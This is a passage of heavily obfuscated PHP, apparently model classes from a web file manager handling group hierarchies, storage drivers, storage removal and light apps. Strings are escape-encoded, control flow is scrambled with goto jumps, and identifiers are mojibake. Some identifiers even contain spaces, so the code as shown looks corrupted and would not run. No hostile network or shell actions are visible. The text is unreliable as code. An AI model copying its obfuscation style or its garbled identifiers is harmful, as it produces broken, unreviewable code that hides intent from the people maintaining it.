"\123\x45\114\x45\103\124\x20\52\x20\106\122\117\x4d\x20\x28\123\x45\114\x45\103\124\x20\x27{$D’ãØŒØêŒ}\137\143\150\x69\154\144\x27\x20\141\x73\40\150\x61\163\40\106\x52\x4f\x4d\40\x60{$bæò¬„›ù}\140\x20\167\x68\x65\162\x65\40\x70\141\x72\x65\x6e\x74\111\x44\75{$D’ãØŒØêŒ}\x20\154\x69\155\x69\164\x20\x31\x29\40\x61\x73\40\x74\142\x5f{$D’ãØŒØêŒ}\x20\x75\x6e\x69\x6f\x6e\x20\141\x6c\x6c\x20"; if (($Fëç≈∂¡πØ >= 20 || $d„≥˜—≠ùﬁ == $b•„‚´øô∏ - 1) && $EòµÖøŒπª) { $EòµÖøŒπª = substr($EòµÖøŒπª, 0, -strlen($b±∂öÖïÿ≠[445])); $Bíâ≥Ÿ‘èê = $this->query($EòµÖøŒπª); $EÿéÛ˘ãÍè = array_merge($EÿéÛ˘ãÍè, $Bíâ≥Ÿ‘èê); $Fëç≈∂¡πØ = 0; $EòµÖøŒπª = $b±∂öÖïÿ≠[33]; } } goto a¿…≥∫ªï«; a¿…≥∫ªï«: $EÿéÛ˘ãÍè = array_to_keyvalue($EÿéÛ˘ãÍè, $b±∂öÖïÿ≠[446]); foreach ($cÍêÑΩÒÉé as &$bç¿—ë…†á) { $bç¿—ë…†á[$b±∂öÖïÿ≠[2169]] = isset($EÿéÛ˘ãÍè[$bç¿—ë…†á[$b±∂öÖïÿ≠[2087]] . $b±∂öÖïÿ≠[2170]]); } goto C˜öåÀ∆˜¥; C˜öåÀ∆˜¥: } private function _listAppendChildrenMember(&$F©Òòºãﬂ¯) { goto DÜø¡ÿÜù«; Dÿÿº°–È˜: $eåíΩ∑•Âˆ = count($F©Òòºãﬂ¯); $c‘É±œ∑è¨ = $this->tablePrefix . $eÊî§ı∑ﬁß[2161]; for ($c¡òØµ∆ÃÌ = 0, $còÜ∂îÀëÃ = 0; $c¡òØµ∆ÃÌ < $eåíΩ∑•Âˆ; $c¡òØµ∆ÃÌ++) { $còÜ∂îÀëÃ++; $Eéë˜ÀÚ¢Ø = $F©Òòºãﬂ¯[$c¡òØµ∆ÃÌ][$eÊî§ı∑ﬁß[2087]]; $e∑áäòúèñ .= "\123\105\x4c\105\103\124\x20\x2a\x20\x46\x52\117\x4d\40\50\123\105\x4c\x45\103\124\x20\x27{$Eéë˜ÀÚ¢Ø}\x5f\x63\150\151\x6c\144\x27\x20\141\x73\x20\150\141\x73\40\x46\122\117\x4d\40\x60{$c‘É±œ∑è¨}\140\x20\x77\x68\145\x72\x65\x20\x67\162\157\165\x70\x49\x44\x3d{$Eéë˜ÀÚ¢Ø}\40\x6c\151\x6d\151\164\x20\61\51\x20\x61\163\x20\x74\142\137{$Eéë˜ÀÚ¢Ø}\40\x75\156\151\x6f\156\40\x61\154\154\40"; if (($còÜ∂îÀëÃ >= 20 || $c¡òØµ∆ÃÌ == $eåíΩ∑•Âˆ - 1) && $e∑áäòúèñ) { $e∑áäòúèñ = substr($e∑áäòúèñ, 0, -strlen($eÊî§ı∑ﬁß[445])); $cØÎ¢ø¯˜π = $this->query($e∑áäòúèñ); $AÓ–ûÇœ⁄’ = array_merge($AÓ–ûÇœ⁄’, $cØÎ¢ø¯˜π); $còÜ∂îÀëÃ = 0; $e∑áäòúèñ = $eÊî§ı∑ﬁß[33]; } } goto D÷ë“£µ´Ù; D÷ë“£µ´Ù: $AÓ–ûÇœ⁄’ = array_to_keyvalue($AÓ–ûÇœ⁄’, $eÊî§ı∑ﬁß[446]); foreach ($F©Òòºãﬂ¯ as &$F—ë∏œá®“) { $F—ë∏œá®“[$eÊî§ı∑ﬁß[2171]] = isset($AÓ–ûÇœ⁄’[$F—ë∏œá®“[$eÊî§ı∑ﬁß[2087]] . $eÊî§ı∑ﬁß[2170]]); } goto f’≥Ï‡á⁄µ; DÜø¡ÿÜù«: $eÊî§ı∑ﬁß =& $_SERVER[¯èãÄπµ]; $e∑áäòúèñ = $eÊî§ı∑ﬁß[357]; $AÓ–ûÇœ⁄’ = array(); goto Dÿÿº°–È˜; f’≥Ï‡á⁄µ: } private function _listAppendMeta(&$CÉ™©ñœ›Ÿ, $E ßøã°¡–) { $b◊∆Ãå±˜ã =& $_SERVER[¯èãÄπµ]; $aæâõËÔ∫ˆ = array($b◊∆Ãå±˜ã[2087] => array($b◊∆Ãå±˜ã[7], $E ßøã°¡–)); $Cù≈û÷œ¯Â = Model($b◊∆Ãå±˜ã[2160])->where($aæâõËÔ∫ˆ)->select(); $Cù≈û÷œ¯Â = array_to_keyvalue_group($Cù≈û÷œ¯Â, $b◊∆Ãå±˜ã[2087]); foreach ($Cù≈û÷œ¯Â as &$b∆˜î‘∑»Ü) { $b∆˜î‘∑»Ü = array_to_keyvalue($b∆˜î‘∑»Ü, $b◊∆Ãå±˜ã[89], $b◊∆Ãå±˜ã[355]); } foreach ($CÉ™©ñœ›Ÿ as &$cÆŸê™æÙü) { $cÆŸê™æÙü[$b◊∆Ãå±˜ã[413]] = array(); if (isset($Cù≈û÷œ¯Â[$cÆŸê™æÙü[$b◊∆Ãå±˜ã[2087]]])) { $cÆŸê™æÙü[$b◊∆Ãå±˜ã[413]] = $Cù≈û÷œ¯Â[$cÆŸê™æÙü[$b◊∆Ãå±˜ã[2087]]]; } } } protected function parentLevelArray($dâä≤ö€È¿) { $e˘√ò¢êÉ– =& $_SERVER[¯èãÄπµ]; $dâä≤ö€È¿ = explode($e˘√ò¢êÉ–[47], trim($dâä≤ö€È¿, $e˘√ò¢êÉ–[47])); $dâä≤ö€È¿ = array_remove_value($dâä≤ö€È¿, $e˘√ò¢êÉ–[464]); return $dâä≤ö€È¿; } private function _listAppendParent(&$aÌ–∑Ù»ãä) { goto DûÕå¢Ñõ˜; C¨©ç”˜Ü‚: $cΩõ¿ù¿°Ì = array(); foreach ($CŸµÌÔ›Î as $aÔëÈÓâŒŸ => $däÒãñ±ö‹) { if (!$däÒãñ±ö‹) { $cΩõ¿ù¿°Ì[] = $aÔëÈÓâŒŸ; } } if ($cΩõ¿ù¿°Ì) { $FÀ÷‘≤∫Ç÷ = array($EïúΩ⁄Ú·≤[2159] => array($EïúΩ⁄Ú·≤[380], $cΩõ¿ù¿°Ì)); $C¥ õéÉç’ = $this->field($EïúΩ⁄Ú·≤[2172])->where($FÀ÷‘≤∫Ç÷)->select(); $DŸ¥à¯ú™‰ = array_to_keyvalue($C¥ õéÉç’, $EïúΩ⁄Ú·≤[2087], $EïúΩ⁄Ú·≤[28]); $CŸµÌÔ›Î = array_merge_index($CŸµÌÔ›Î, $DŸ¥à¯ú™‰); } goto D⁄»öÃÔéÉ; DûÕå¢Ñõ˜: $EïúΩ⁄Ú·≤ =& $_SERVER[¯èãÄπµ]; $CŸµÌÔ›Î = array(); foreach ($aÌ–∑Ù»ãä as &$cΩ´ÙôÉ¶≤) { $CŸµÌÔ›Î[$cΩ´ÙôÉ¶≤[$EïúΩ⁄Ú·≤[2087]]] = $cΩ´ÙôÉ¶≤[$EïúΩ⁄Ú·≤[28]]; $c≈›€Öú†ﬂ = $this->parentLevelArray($cΩ´ÙôÉ¶≤[$EïúΩ⁄Ú·≤[455]]); foreach ($c≈›€Öú†ﬂ as $BÊŒ¥íüÎ™) { if (!isset($CŸµÌÔ›Î[$BÊŒ¥íüÎ™])) { $CŸµÌÔ›Î[$BÊŒ¥íüÎ™] = 0; } } } goto C¨©ç”˜Ü‚; D⁄»öÃÔéÉ: foreach ($aÌ–∑Ù»ãä as &$cΩ´ÙôÉ¶≤) { $c≈›€Öú†ﬂ = $this->parentLevelArray($cΩ´ÙôÉ¶≤[$EïúΩ⁄Ú·≤[455]]); $Cäí∫Ê⁄∑ï = $EïúΩ⁄Ú·≤[33]; foreach ($c≈›€Öú†ﬂ as $BÊŒ¥íüÎ™) { $Cäí∫Ê⁄∑ï .= $CŸµÌÔ›Î[$BÊŒ¥íüÎ™] . $EïúΩ⁄Ú·≤[8]; } if ($c≈›€Öú†ﬂ) { $Cäí∫Ê⁄∑ï .= $cΩ´ÙôÉ¶≤[$EïúΩ⁄Ú·≤[28]]; } $cΩ´ÙôÉ¶≤[$EïúΩ⁄Ú·≤[459]] = str_replace($EïúΩ⁄Ú·≤[463], $EïúΩ⁄Ú·≤[8], $Cäí∫Ê⁄∑ï); } goto CÉÜ´ë≥ô¬; CÉÜ´ë≥ô¬: } private function _listAppendSourceRoot(&$cïæ“‹È’è, $f∞ﬂèÖ≥ú’) { goto B§Æû‹ŒŸÿ; AÍ‹ïı¯Æò: foreach ($cïæ“‹È’è as &$A≤»¨ÉÒŸ∆) { $A≤»¨ÉÒŸ∆[$DãÈü¡ŸÉÂ[387]] = $a ≈Ü´‰Ÿ[$A≤»¨ÉÒŸ∆[$DãÈü¡ŸÉÂ[2087]]] ? $a ≈Ü´‰Ÿ[$A≤»¨ÉÒŸ∆[$DãÈü¡ŸÉÂ[2087]]] : array(); } goto cöΩèÆı≥Ç; C÷õ·éƒ—à: $a ≈Ü´‰Ÿ = Model($DãÈü¡ŸÉÂ[755])->order($DãÈü¡ŸÉÂ[2174])->field($Cœˆ¶˘¯“û)->where($dÏéÏ‰“ﬂı)->select(); $a ≈Ü´‰Ÿ = array_to_keyvalue($a ≈Ü´‰Ÿ, $DãÈü¡ŸÉÂ[452]); $a ≈Ü´‰Ÿ = array_remove_key($a ≈Ü´‰Ÿ, $DãÈü¡ŸÉÂ[452]); goto AÍ‹ïı¯Æò; B§Æû‹ŒŸÿ: $DãÈü¡ŸÉÂ =& $_SERVER[¯èãÄπµ]; $dÏéÏ‰“ﬂı = array($DãÈü¡ŸÉÂ[367] => SourceModel::TYPE_GROUP, $DãÈü¡ŸÉÂ[457] => 0, $DãÈü¡ŸÉÂ[452] => array($DãÈü¡ŸÉÂ[7], $f∞ﬂèÖ≥ú’)); $Cœˆ¶˘¯“û = $DãÈü¡ŸÉÂ[2173]; goto C÷õ·éƒ—à; cöΩèÆı≥Ç: } protected function resetParentLevel() { $B‹ñÉôÇ¿∫ =& $_SERVER[¯èãÄπµ]; $c÷∆™≤Ù÷Ω = $B‹ñÉôÇ¿∫[2087]; $dÇøÉá√è° = $this->select(); $dÇøÉá√è° = array_to_keyvalue($dÇøÉá√è°, $c÷∆™≤Ù÷Ω); foreach ($dÇøÉá√è° as $F¶¯ã–ÖÛΩ) { goto b™≤ê±â◊ä; BÊóﬂòÿ’≈: $Cçñ˜ãˆŒå[] = 0; $Cçñ˜ãˆŒå = $B‹ñÉôÇ¿∫[47] . implode($B‹ñÉôÇ¿∫[47], array_reverse($Cçñ˜ãˆŒå)) . $B‹ñÉôÇ¿∫[47]; $this->setNamePinyin($F¶¯ã–ÖÛΩ[$c÷∆™≤Ù÷Ω], $F¶¯ã–ÖÛΩ[$B‹ñÉôÇ¿∫[28]]); goto d®Ñ©±†Ÿπ; d®Ñ©±†Ÿπ: $this->where(array($c÷∆™≤Ù÷Ω => $F¶¯ã–ÖÛΩ[$c÷∆™≤Ù÷Ω]))->save(array($B‹ñÉôÇ¿∫[521] => $Cçñ˜ãˆŒå)); goto BØÙÑı´°ÿ; b™≤ê±â◊ä: $Fá∏™àÎÜ∞ = $F¶¯ã–ÖÛΩ; $Cçñ˜ãˆŒå = array(); while ($Fá∏™àÎÜ∞[$B‹ñÉôÇ¿∫[457]] != 0) { $Cçñ˜ãˆŒå[] = $Fá∏™àÎÜ∞[$B‹ñÉôÇ¿∫[457]]; $Fá∏™àÎÜ∞ = $dÇøÉá√è°[$Fá∏™àÎÜ∞[$B‹ñÉôÇ¿∫[457]]]; } goto BÊóﬂòÿ’≈; BØÙÑı´°ÿ: } return $dÇøÉá√è°; } public function groupNameAuto($E¨ÜüïßÚ›, $eﬂìôåÔ‚·) { $eµÍ¢Ëí…ÿ =& $_SERVER[¯èãÄπµ]; $cÑ…“»πÀ∫ = $this->where(array($eµÍ¢Ëí…ÿ[364] => $E¨ÜüïßÚ›))->getField($eµÍ¢Ëí…ÿ[28], !0); if (!$cÑ…“»πÀ∫ || !in_array($eﬂìôåÔ‚·, $cÑ…“»πÀ∫)) { return $eﬂìôåÔ‚·; } for ($dì¿≠∂¡éŒ = 1; $dì¿≠∂¡éŒ <= count($cÑ…“»πÀ∫) + 1; $dì¿≠∂¡éŒ++) { $e√ò…—ä£á = $eﬂìôåÔ‚· . "\x28{$dì¿≠∂¡éŒ}\x29"; if (!in_array($e√ò…—ä£á, $cÑ…“»πÀ∫)) { return $e√ò…—ä£á; } } } } goto f‚¡Ë∑éá£; FÜöóˆÆÀ˘: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\163\164\157\x72\x61\x67\145\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\163\151\172\145\115\141\x78", "\x73\171\163\x74\145\x6d", "\144\x65\x66\x61\165\154\x74", "\144\x72\x69\166\145\x72", "\143\x6f\156\x66\151\147"); public function listData($DÖ¶ı›ñ•ù = false, $A¿Ùã¯∏˘É = "\155\x6f\144\x69\146\x79\x54\x69\155\x65", $bµæø‘ø¡Ô = false) { goto dΩ‹ø⁄Ô”•; eæëØˆ›° : return $aüà°¡«é£; goto b¢€ù∂çªé; dΩ‹ø⁄Ô”•: $D‡ŒØ˘ë∏ =& $_SERVER[¯èãÄπµ]; $aüà°¡«é£ = parent::listData($DÖ¶ı›ñ•ù, $A¿Ùã¯∏˘É, $bµæø‘ø¡Ô); if ($DÖ¶ı›ñ•ù) { return $aüà°¡«é£; } goto cÛÉˆﬁä⁄õ; cÛÉˆﬁä⁄õ: foreach ($aüà°¡«é£ as $cõ´ÀäŒØÂ => $bâ…úª°⁄É) { unset($aüà°¡«é£[$cõ´ÀäŒØÂ][$D‡ŒØ˘ë∏[6]]); $aüà°¡«é£[$cõ´ÀäŒØÂ][$D‡ŒØ˘ë∏[2073]] = 0; } $fÚ˘∑ê´ãÕ = array_to_keyvalue($aüà°¡«é£, $D‡ŒØ˘ë∏[33], $D‡ŒØ˘ë∏[363]); $this->_listAppendSize($aüà°¡«é£, $fÚ˘∑ê´ãÕ); goto eæëØˆ›° ; b¢€ù∂çªé: } public function _listAppendSize(&$C©Ÿ¶≥€πﬂ, $EöÖ≠à¢üØ) { $D§•ã∫È‰Ú =& $_SERVER[¯èãÄπµ]; $EéºÑ±Æ§‚ = $D§•ã∫È‰Ú[2346] . implode($D§•ã∫È‰Ú[47], $EöÖ≠à¢üØ) . $D§•ã∫È‰Ú[2347]; $bπ»È¯â∞ª = Model($D§•ã∫È‰Ú[722])->query($EéºÑ±Æ§‚); $bπ»È¯â∞ª = array_to_keyvalue($bπ»È¯â∞ª, $D§•ã∫È‰Ú[363], $D§•ã∫È‰Ú[77]); foreach ($C©Ÿ¶≥€πﬂ as $d¨’†–Öè§ => $F·…à°—⁄˜) { $C©Ÿ¶≥€πﬂ[$d¨’†–Öè§][$D§•ã∫È‰Ú[2073]] = isset($bπ»È¯â∞ª[$F·…à°—⁄˜[$D§•ã∫È‰Ú[363]]]) ? $bπ»È¯â∞ª[$F·…à°—⁄˜[$D§•ã∫È‰Ú[363]]] : 0; } } public function getConfig($AÂ»‡ºê™ø) { $A‹†≤ÔŒèÆ = parent::listData($AÂ»‡ºê™ø); return json_decode($A‹†≤ÔŒèÆ[$_SERVER[¯èãÄπµ][6]], !0); } public function update($eÖ£‚á¯ﬁ∞, $f´≈–ó›Ü¡) { goto cï‹®£‰à≥; A∑«Ü”ÓßË: if (isset($aÔÀ√âóãÎ[$eÇÏ˘∞Ø·º]) && $aÔÀ√âóãÎ[$eÇÏ˘∞Ø·º][$Aä’øÇáÖ∫[363]] != $eÖ£‚á¯ﬁ∞) { return !1; } if (isset($f´≈–ó›Ü¡[$Aä’øÇáÖ∫[2348]]) && $f´≈–ó›Ü¡[$Aä’øÇáÖ∫[2348]] == $Aä’øÇáÖ∫[83]) { $this->checkConfig($f´≈–ó›Ü¡); } unset($f´≈–ó›Ü¡[$Aä’øÇáÖ∫[2348]]); goto Dçµíæ¢«è; Dçµíæ¢«è: $cŒËî≈‚π¢ = parent::update($eÖ£‚á¯ﬁ∞, $f´≈–ó›Ü¡); if ($cŒËî≈‚π¢ && $f´≈–ó›Ü¡[$Aä’øÇáÖ∫[34]]) { foreach ($aÔÀ√âóãÎ as $A‰ﬂ∞Ò∏™á) { if ($A‰ﬂ∞Ò∏™á[$Aä’øÇáÖ∫[34]] && $A‰ﬂ∞Ò∏™á[$Aä’øÇáÖ∫[363]] != $eÖ£‚á¯ﬁ∞) { parent::update($A‰ﬂ∞Ò∏™á[$Aä’øÇáÖ∫[363]], array($Aä’øÇáÖ∫[34] => 0)); } } } return $cŒËî≈‚π¢; goto e—“”‹¬°ﬂ; cï‹®£‰à≥: $Aä’øÇáÖ∫ =& $_SERVER[¯èãÄπµ]; $eÇÏ˘∞Ø·º = $f´≈–ó›Ü¡[$Aä’øÇáÖ∫[28]]; $aÔÀ√âóãÎ = array_to_keyvalue(parent::listData(), $Aä’øÇáÖ∫[28]); goto A∑«Ü”ÓßË; e—“”‹¬°ﬂ: } public function add($d‘πóèÇªã) { goto b∏◊Æëπ‘⁄; cßÏˆŒ”àﬂ: return $fèÖöøä∑Õ; goto f∫ï©òíà†; b∏◊Æëπ‘⁄: $dÀΩ†ôÌºä =& $_SERVER[¯èãÄπµ]; $c†“äÇù◊¡ = array_to_keyvalue(parent::listData(), $dÀΩ†ôÌºä[28]); if (isset($c†“äÇù◊¡[$d‘πóèÇªã[$dÀΩ†ôÌºä[28]]])) { return !1; } goto dêÒÇ°Çà£; dêÒÇ°Çà£: $this->checkConfig($d‘πóèÇªã); $fèÖöøä∑Õ = parent::insert($d‘πóèÇªã); if ($fèÖöøä∑Õ && $d‘πóèÇªã[$dÀΩ†ôÌºä[34]]) { foreach ($c†“äÇù◊¡ as $cø„”Çîµ») { if ($cø„”Çîµ»[$dÀΩ†ôÌºä[34]]) { parent::update($cø„”Çîµ»[$dÀΩ†ôÌºä[363]], array($dÀΩ†ôÌºä[34] => 0)); } } } goto cßÏˆŒ”àﬂ; f∫ï©òíà†: } public function checkConfig(&$a≠æ•â∫¯Ë) { goto câ ›˘€›Î; câ ›˘€›Î: $c“Ö∏≠Ïµ∞ =& $_SERVER[¯èãÄπµ]; $eá£ áﬂÔÛ = strtolower($a≠æ•â∫¯Ë[$c“Ö∏≠Ïµ∞[90]]); $cÏæÕ◊ıòù = json_decode($a≠æ•â∫¯Ë[$c“Ö∏≠Ïµ∞[6]], !0); goto b“Øº◊ã»ê; b“Øº◊ã»ê: foreach ($cÏæÕ◊ıòù as $B˜ãÆêˆ·◊ => $dÓÀåúæòä) { $cÏæÕ◊ıòù[$B˜ãÆêˆ·◊] = trim($dÓÀåúæòä); } $BÙÒ‚í≤•Á = rtrim($cÏæÕ◊ıòù[$c“Ö∏≠Ïµ∞[1026]], $c“Ö∏≠Ïµ∞[8]) . $c“Ö∏≠Ïµ∞[8]; $Aöüˆ†“∂Ñ = $this->driverType($eá£ áﬂÔÛ); goto FÔ¨Ñ¥ôµ‚; Fºå∏◊œÆô: $Cæº›ÂÖÛë = $e›∏Î‡±ÂŒ->getPath($BÙÒ‚í≤•Á . $c“Ö∏≠Ïµ∞[1969]); if (!$e›∏Î‡±ÂŒ->mkfile($Cæº›ÂÖÛë)) { show_json(LNG($c“Ö∏≠Ïµ∞[2349]), !1); } $cÏæÕ◊ıòù[$c“Ö∏≠Ïµ∞[1026]] = $BÙÒ‚í≤•Á; goto eë∏ääˆ†Û; FÔ¨Ñ¥ôµ‚: $A≥üáü¿÷ä = $c“Ö∏≠Ïµ∞[71] . $Aöüˆ†“∂Ñ; $e›∏Î‡±ÂŒ = new $A≥üáü¿÷ä($cÏæÕ◊ıòù); if (in_array($eá£ áﬂÔÛ, $e›∏Î‡±ÂŒ->objectDriver)) { if (!$e›∏Î‡±ÂŒ->isBucketCors() && !$e›∏Î‡±ÂŒ->setBucketCors()) { $EÈÛÇ≥»ë» = LNG($c“Ö∏≠Ïµ∞[2349]); $EÈÛÇ≥»ë» .= $c“Ö∏≠Ïµ∞[2350] . LNG($c“Ö∏≠Ïµ∞[2351]); show_json($EÈÛÇ≥»ë», !1); } } goto Fºå∏◊œÆô; eë∏ääˆ†Û: $a≠æ•â∫¯Ë[$c“Ö∏≠Ïµ∞[6]] = json_encode($cÏæÕ◊ıòù); $a≠æ•â∫¯Ë[$c“Ö∏≠Ïµ∞[90]] = $Aöüˆ†“∂Ñ; return !0; goto eÓº¶˜‡≠∞; eÓº¶˜‡≠∞: } private function driverType($D¿‡•£÷êÃ) { $b–’ã€–ºÎ =& $_SERVER[¯èãÄπµ]; $Dœ¬ﬁ‹óÊò = array($b–’ã€–ºÎ[101] => $b–’ã€–ºÎ[2352], $b–’ã€–ºÎ[58] => $b–’ã€–ºÎ[2353], $b–’ã€–ºÎ[64] => $b–’ã€–ºÎ[2354]); if (isset($Dœ¬ﬁ‹óÊò[$D¿‡•£÷êÃ])) { return $Dœ¬ﬁ‹óÊò[$D¿‡•£÷êÃ]; } return strtoupper($D¿‡•£÷êÃ); } public function driverListSystem() { $E‘ √ÎÁÿÆ =& $_SERVER[¯èãÄπµ]; $D©àˆóÍ»á = parent::listData(); $c«ÒﬂÔÉ»É = array(); foreach ($D©àˆóÍ»á as $a»µ≥¶“ƒ‚) { unset($a»µ≥¶“ƒ‚[$E‘ √ÎÁÿÆ[183]], $a»µ≥¶“ƒ‚[$E‘ √ÎÁÿÆ[106]]); $a»µ≥¶“ƒ‚[$E‘ √ÎÁÿÆ[6]] = json_decode($a»µ≥¶“ƒ‚[$E‘ √ÎÁÿÆ[6]], !0); $c«ÒﬂÔÉ»É[] = $a»µ≥¶“ƒ‚; } return $c«ÒﬂÔÉ»É; } public function defaultDriver() { $C∑‘ë‘Ë„‘ =& $_SERVER[¯èãÄπµ]; $eéıºÔ°·Î = parent::listData(); $dÇ‚úÖÓÔ∞ = array_filter_by_field($eéıºÔ°·Î, $C∑‘ë‘Ë„‘[34], 1); $dÇ‚úÖÓÔ∞ = $dÇ‚úÖÓÔ∞[0]; if ($dÇ‚úÖÓÔ∞) { $dÇ‚úÖÓÔ∞[$C∑‘ë‘Ë„‘[6]] = json_decode($dÇ‚úÖÓÔ∞[$C∑‘ë‘Ë„‘[6]], !0); } return $dÇ‚úÖÓÔ∞; } public function driverInfo($F˘£ÈªÜÖ—) { $fø®“‡ßù« =& $_SERVER[¯èãÄπµ]; $dıæ€ç”Éø = array_to_keyvalue(parent::listData(), $fø®“‡ßù«[363]); if (!isset($dıæ€ç”Éø[$F˘£ÈªÜÖ—])) { return !1; } $c÷≥€©¶˜Â = $dıæ€ç”Éø[$F˘£ÈªÜÖ—]; $c÷≥€©¶˜Â[$fø®“‡ßù«[6]] = json_decode($c÷≥€©¶˜Â[$fø®“‡ßù«[6]], !0); return $c÷≥€©¶˜Â; } public function remove($Cã±’ã˘ºÍ) { $this->removeShareItems($Cã±’ã˘ºÍ); return parent::remove($Cã±’ã˘ºÍ); } public function removeWithFile($fè‰ù—°¢Ñ) { goto Bªñ•œ¿Ìß; aæããóÑè¢: if (!$e¢∑¶∞ûñä) { $dìå÷—∆“’->stop($e∑¡Ñ‡‚‹Ÿ); return !1; } $dìå÷—∆“’->end(); $this->remove($fè‰ù—°¢Ñ); goto f¯≈ú÷Í†≥; BÜÜûÏÃ´â: $fÖ•áá…«÷ = "\x7b\x69\x6f\x3a{$fÜÆÁ‰ñë‘}\x7d\57"; $e¢∑¶∞ûñä = !0; $FñÇ∞∆†’∏ = array(); goto FìƒÉè·øâ; FìƒÉè·øâ: $B–‹£◊£√ã = Model($d∑•¨ëËªó[163])->where($fØê®â≤÷¬)->field($d∑•¨ëËªó[2358])->select(); foreach ($B–‹£◊£√ã as $aÍÀﬂû∫≈ë) { goto b”õÀø»Ë¿; föë˜ƒÔ¬≥: $F˘î˘ª˘ÛÔ = array($d∑•¨ëËªó[746] => $fÜÆÁ‰ñë‘, $d∑•¨ëËªó[75] => $d‰•ª⁄√†ï); Model($d∑•¨ëËªó[163])->where($fØê®â≤÷¬)->save($F˘î˘ª˘ÛÔ); goto Eƒ§‚Ã£¶ù; F†ÚÈ«™ƒ≥: if (IO::exist($d‰•ª⁄√†ï)) { $dìå÷—∆“’->updateFileEnd($aÍÀﬂû∫≈ë[$d∑•¨ëËªó[28]], $aÍÀﬂû∫≈ë[$d∑•¨ëËªó[77]]); continue; } if (!IO::move($c…ÖéäñÏ°, get_path_father($d‰•ª⁄√†ï))) { $e¢∑¶∞ûñä = !1; break; } $fØê®â≤÷¬ = array($d∑•¨ëËªó[415] => $aÍÀﬂû∫≈ë[$d∑•¨ëËªó[415]]); goto föë˜ƒÔ¬≥; b”õÀø»Ë¿: $c…ÖéäñÏ° = $aÍÀﬂû∫≈ë[$d∑•¨ëËªó[75]]; $d‰•ª⁄√†ï = $fÖ•áá…«÷ . str_replace("\173\x69\157\72{$fè‰ù—°¢Ñ}\175\x2f", $d∑•¨ëËªó[33], $c…ÖéäñÏ°); if (!IO::exist($c…ÖéäñÏ°)) { $FñÇ∞∆†’∏[] = $aÍÀﬂû∫≈ë[$d∑•¨ëËªó[415]]; $dìå÷—∆“’->updateFileEnd($aÍÀﬂû∫≈ë[$d∑•¨ëËªó[28]], $aÍÀﬂû∫≈ë[$d∑•¨ëËªó[77]]); continue; } goto F†ÚÈ«™ƒ≥; Eƒ§‚Ã£¶ù: } $this->removeByFileID($FñÇ∞∆†’∏); goto aæããóÑè¢; Dá¢Ïñ†˘î: $dìå÷—∆“’->task[$d∑•¨ëËªó[701]] = (double) $c§°ê•Íåº; $bﬂèéÓΩÿπ = KodIO::defaultDriver(); $fÜÆÁ‰ñë‘ = $bﬂèéÓΩÿπ[$d∑•¨ëËªó[363]]; goto BÜÜûÏÃ´â; eû≤®⁄¢ì—: $c§°ê•Íåº = Model($d∑•¨ëËªó[418])->where($fØê®â≤÷¬)->sum($d∑•¨ëËªó[77]); $e∑¡Ñ‡‚‹Ÿ = $d∑•¨ëËªó[2355] . $fè‰ù—°¢Ñ; $dìå÷—∆“’ = new TaskFileTransfer($e∑¡Ñ‡‚‹Ÿ, $d∑•¨ëËªó[2356], $cÎ√ÊÖÍ÷È, LNG($d∑•¨ëËªó[2357]) . "\x28{$fè‰ù—°¢Ñ}\51"); goto Dá¢Ïñ†˘î; Bªñ•œ¿Ìß: $d∑•¨ëËªó =& $_SERVER[¯èãÄπµ]; $fØê®â≤÷¬ = array($d∑•¨ëËªó[746] => $fè‰ù—°¢Ñ); $cÎ√ÊÖÍ÷È = Model($d∑•¨ëËªó[418])->where($fØê®â≤÷¬)->count(); goto eû≤®⁄¢ì—; f¯≈ú÷Í†≥: } public function progress($E“¶Ÿ¶∏›Â) { return Task::get($_SERVER[¯èãÄπµ][2355] . $E“¶Ÿ¶∏›Â); } private function removeByFileID($Cü®ªùáÆÁ = array()) { goto e‹“ûÇëÓÔ; Eß¢çÎÙ‰ø: foreach ($EñëÕ–æ © as $CÍÉ”∂ªù ) { Model($d•äÜØêÕã[378])->removeNow($CÍÉ”∂ªù , !1); } goto Fƒ≥ö∆ÿî∫; e‹“ûÇëÓÔ: $d•äÜØêÕã =& $_SERVER[¯èãÄπµ]; if (empty($Cü®ªùáÆÁ)) { return; } $B”·ÑµëÌ¿ = array($d•äÜØêÕã[415] => array($d•äÜØêÕã[7], $Cü®ªùáÆÁ)); goto aú·ÎçúÚ«; aú·ÎçúÚ«: $EñëÕ–æ © = Model($d•äÜØêÕã[1112])->where($B”·ÑµëÌ¿)->field($d•äÜØêÕã[365])->select(); if (!$EñëÕ–æ ©) { return; } $EñëÕ–æ © = array_to_keyvalue($EñëÕ–æ ©, $d•äÜØêÕã[33], $d•äÜØêÕã[365]); goto Eß¢çÎÙ‰ø; Fƒ≥ö∆ÿî∫: } private function removeShareItems($e —©æë ì) { goto EôíÜÃ…Ù‰; BÌç÷á∂√◊: $EÀ¥’Ã◊Ø¡ = Model($dÔˆ£ô–î¬[2064])->where($Cˆ¬óÍ†ÆÑ)->field($dÔˆ£ô–î¬[437])->select(); if (empty($EÀ¥’Ã◊Ø¡)) { return; } $F’∞…ü›§  = array_to_keyvalue($EÀ¥’Ã◊Ø¡, $dÔˆ£ô–î¬[33], $dÔˆ£ô–î¬[437]); goto a€ÜéŸÉê ; EôíÜÃ…Ù‰: $dÔˆ£ô–î¬ =& $_SERVER[¯èãÄπµ]; $a›∑““àÆ– = "\173\151\x6f\x3a{$e —©æë ì}\175\57"; $Cˆ¬óÍ†ÆÑ = array($dÔˆ£ô–î¬[365] => 0, $dÔˆ£ô–î¬[1020] => array($dÔˆ£ô–î¬[754], "{$a›∑““àÆ–}\x25")); goto BÌç÷á∂√◊; a€ÜéŸÉê : Model($dÔˆ£ô–î¬[532])->remove($F’∞…ü›§ ); goto F∞ãÑ·¿ıÁ; F∞ãÑ·¿ıÁ: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\56\x4c\x69\x67\x68\164\x41\x70\160"; public $modelType = "\123\171\163\x74\x65\x6d\x4f\x70\x74\x69\157\x6e"; public $field = array("\x6e\x61\x6d\x65", "\147\162\x6f\x75\160", "\144\x65\163\143", "\143\157\x6e\164\145\156\x74"); public function listData($Eùù¬Ì¿Œ— = false, $d‰ÁìÀêë¯ = "\155\x6f\x64\x69\146\171\124\x69\155\x65", $bˆµò»ÍìÜ = true) { return parent::listData($Eùù¬Ì¿Œ—, $d‰ÁìÀêë¯, $bˆµò»ÍìÜ); } public function remove($cœŸóı¡Ûà) { $cÿöïÙ†±¯ = $this->findByName($cœŸóı¡Ûà); if (!$cÿöïÙ†±¯) { return !1; } 